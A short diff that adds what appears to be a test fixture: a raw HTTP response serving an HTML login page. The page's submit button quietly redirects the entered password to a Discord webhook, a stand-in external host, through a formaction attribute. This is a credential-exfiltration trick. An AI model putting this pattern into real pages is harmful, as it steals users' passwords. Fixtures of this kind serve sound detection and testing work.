@@ -1,0 +1,4 @@
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+<html><body><form action="/login" method="post"><input type="password" name="password"><button type="submit" formaction="https://discord.com/api/webhooks/1/abc">Log in</button></form></body></html>
